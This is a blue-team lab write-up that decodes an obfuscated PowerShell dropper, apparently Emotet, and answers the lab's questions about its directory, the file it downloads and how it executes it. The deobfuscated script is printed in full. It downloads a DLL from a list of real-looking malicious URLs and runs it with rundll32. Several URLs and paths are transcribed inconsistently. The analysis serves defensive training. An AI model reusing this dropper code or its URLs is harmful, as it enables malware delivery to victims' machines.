<h1>Blue Team Labs Online - Malicious PowerShell Analysis lab</h1>

<h2>Scenario</h2>
Recently the networks of a large company named GothamLegend were compromised after an employee opened a phishing email containing malware. The damage caused was critical and resulted in business-wide disruption. GothamLegend had to reach out to a third-party incident response team to assist with the investigation. You are a member of the IR team - all you have is an encoded Powershell script. Can you decode it and identify what malware is responsible for this attack?
<br />


<h2>Utilities Used</h2>

- <b>Cyberchef</b> 

<h2>Lab walk-through:</h2>

<!-- <p align="center"> -->
Step 1: <br/> Downloading the appropriate files. In this case, we are privided with the encoded powershell script. <br/>

Step 2: <br /> Research. I came across <a href="https://www.reddit.com/r/cybersecurity/comments/12w808u/easiest_way_to_deobfuscate_heavily_obfuscated/">this</a> Reddit post in which the poster mentions that they usually use the following recipe in Cyberchef: <br /> 
  - From Base64 <br />
  - Decode text <br />
  - Beautify <br />
  - Remove null bytes <br />
  - Gunzip <br />

Using this as a baseline, I went with the following recipe for this particular porblem: <br />
  - From Base64 <br />
  - Remove null bytes <br />
  - Render Markdown <br />

The screenshot below shoes the output obtained from Cyberchef <br />

<img src="https://i.imgur.com/CSLmwwu.png" height="80%" width="80%" alt="Output of recipe in Cyberchef"/> <br />
 Here is the script cleaned up:
 ```
Set-Item ([Type]("{0}{1}{2}{4}{3}" -f 'System','eM.','io.DI','ORY','rect'));

Set-Item ('vaR'+'IabLE'+':mBu') ([Type]("{6}{8}{0}{3}{4}{5}{2}{7}{1}" -f 'SteM','Ger','Ma','.n','et.seRVIcepOi','nt','s','NA','Y'));

$ErrorActionPreference = ('Silently'+'Continue');

$Cvmmq4o = $Q26L +   + $E16H;
$J16J = ('N'+('_0'+'P'));

(Dir Variable:Mku).Value::"CreateDirectory"($HOME + ('{0}Db_bh30Yf5be5g{0}' -f [char]92));

$C39Y = ('U68S');

([Variable]("m"+"bu") -Valueon)::"Securityprotocol" = ('Tls12');

$F35I = ('I4_B');
$Swrp6tc = ('A69S');
$X27H = ('C33O');
$Imd1yck = $HOME + (('UOHDb_'+'b'+'h30UOHYf5be5gUOH').Replace('UOH',[String][char]92)) + $Swrp6tc + ('.dll');

$K47V = ('R49G');
$B9fhbyv = ('anw[3s://admink.com/wp-admin/L/@]anw[3s://mikegeerinck.com/c/YYsa/@]anw[3://freelancerwebdesignerhyderabad.com/cgi-bin/S/@]anw[3://etdog.com/wp-content/nu/@]anw[3s://www.hintup.com.br/wp-content/de/@]anw[3://www.stmarouns.edu.au/paypal/b8G/@]anw[3s://www.mcdevelop.net/content/6F2gd/').Replace((']anw[3'),([array]('sd','sw'),('http'),'3d')[1]).Split($C83R + $Cvmmq4o + $F10Q);

$Q52M = ('P05K');

foreach ($Bm5pw6z in $B9fhbyv){
    try {
        (&('New'+'-Object') System.Net.WebClient)."DownloadFile"($Bm5pw6z, $Imd1yck);
        $Z10L = ('A92Q');
        If ((&('Get-Item') $Imd1yck)."length" -ge 35698) {
            &('rundll32') $Imd1yck,(('Control_RunDLL')+'.'+"TOSTRING")();
            $R65I = ('Z09B');
            break;
            $K7_H = ('F12U');
        }
    } catch {}
}

$W54I = ('V95O');
````
<br />
  
<b>Question 1:</b>  <br/> 
<b>What security protocol is being used for the communication with a malicious domain?</b> <br />
  Upon looking over the output from Cyberchef, I noticed a line <i>"sEcuRITYproTocol" = ('T'+('ls'+'12'))</i>. The security protocol being used for communication with a malicious domain is <b>TLS 12</b>.
   <br />
   
<b>Question 2:</b>  <br/> 
<b>What directory does the obfuscated PowerShell create? (Starting from \HOME\)</b> <br />
Further review of the output lead me to a line <i>"cREAtedIRECTORy"($HOME + (('{'+'0}Db_bh'+'30'+'{0}'+'Yf'+'5be5g{0}') -F [chAR]92))</i>. The expression ('{'+'0}Db_bh'+'30'+'{0}'+'Yf'+'5be5g{0}') when deconcatenated translates to {0}Bd_bh30{0}Yf5be5g{0}. Upon some further research, I learned that -F is a format operator that can format a string with placeholders. <br />

  <img src="https://i.imgur.com/Sj3uUIU.png" height="80%" width="80%" alt="Syntax for the format operator -F"/> <br />
  
  and that char[92] translates to backslash in ASCII <br />
  
   <img src="https://i.imgur.com/d1TpuGV.png" height="80%" width="80%" alt="ASCII table"/> <br />
   
 The powershell creates the directory <b> \HOME\Db_bh30\Yf5be5g\ </b>

<b>Question 3:</b>  <br/> 
<b>What file is being downloaded (full name)?</b> <br />
Looking at the script: <br />
- $Imd1yck = HOME\Dubh30\Yf5be5g\A69S.dll <br />
    ```
    -> $Imd1yck = $HOME + (('UOHDb_'+'b'+'h30UOHYf5be5gUOH').Replace('UOH',[String][char]92)) + $Swrp6tc + ('.dll');
    -> $Imd1yck= $HOME + ('UOHDb_bh30UOHYf5be5gUOH').Replace('UOH',[String][char]92)) + $Swrp6tc + ('.dll');
    -> replace every instance of UOH with backslash = Db_bh30\Yf5be5g\
    -> in the script we are given $Swrp6tc = A69S.
    -> concat what we have left and $Imd1yck = \HOME\Db_bh30\Yf5be5g\A69S.dll
    ```
- $B9fhbyv = array of URLs
    ```
    -> $B9fhbyv = ('anw[3s://admink.com/wp-admin/L/@]anw[3s://mikegeerinck.com/c/YYsa/@]anw[3://freelancerwebdesignerhyderabad.com/cgi-bin/S/@]anw[3://etdog.com/wp-content/nu/@]anw[3s://www.hintup.com.br/wp-  content/de/@]anw[3://www.stmarouns.edu.au/paypal/b8G/@]anw[3s://www.mcdevelop.net/content/6F2gd/').Replace((']anw[3'),([array]('sd','sw'),('http'),'3d')[1]).Split($C83R + $Cvmmq4o + $F10Q);
    -> the .Replace function calls for any instance of ]anw[3 to be replaced with [array]('sd','sw'),('http'),'3d')[1]
        - [array]('sd','sw'),('http'),'3d')[1] is creating a an array with the values sd, sw, and http. '3d')[1] is saying to select the second element of the array, which is http
        - I assumed that the split function called to split the string at any instance of @[ since we are not provided with the valules of the variables ($C83R + $Cvmmq4o + $F10Q).
    -> we get an array of the following URLs:
        https://admink.com/wp-admin/L/
        https://mikegerinck.com/ccYYsa/
        https://freelancerwebdesignerhabaderabad.com/cgi-bin/S/
        https://etdog.com/wp-content/nu/
        https://www.hintup.com.br/wp-content/de/
        https://www.stmarouns.nsw.edu.au/paypal/b8G/
        https://wm.mcdevelop.net/content/6F2gd/
    -> Lets look at the foreach loop
            
            foreach ($Bm5pw6z in $B9fhbyv){
            try {
                ((New-Object) System.Net.WebClient)."DownloadFile"($Bm5pw6z, $Imd1yck);
           
    -> for each URL in the array of URLs, download a file from that URL specified by that URL +  $Imd1yck which is \HOME\Db_bh30\Yf5be5g\A69S.dll.
    ```
The file being downloaded is <b>A69S.dll</b> <br />
    
<b>Question 4:</b>  <br/> 
<b>What is used to execute the downloaded file?</b>
```
        If ((&('Get-Item') $Imd1yck)."length" -ge 35698) {
            &('rundll32') $Imd1yck,(('Control_RunDLL')+'.'+"TOSTRING")();
            $R65I = ('Z09B');
            break;
            $K7_H = ('F12U');
        }
  -> if the length of the file downlaoded from the url with the path \HOME\Db_bh30\Yf5be5g\A69S.dll is greater than 35698 bytes then run the dll file donwloaded as an executable (rundll32).
```
<b> rundll32 </b> is being used to execute the downloaded file


<b>Question 5:</b>  <br/> 
<b> What is the domain name of the URI ending in ‘/6F2gd/’ </b> <br />
The URI as a whole is https://wm.mcdevelop.net/content/6F2gd/ and the domain name is <b>wm.mcdevelop.net</b> <br />

<b>Question 6:</b>  <br/> 
<b>Based on the analysis of the obfuscated code, what is the name of the malware?</b>
I searched the file A69S.dll on Malware Bazaar and got a hit for the malware known as <b>Emotet</b>. <br />
<img src="https://i.imgur.com/a584Ymr.png" height="80%" width="80%" alt="information about the malware Emotet on Malware Bazaar"/>
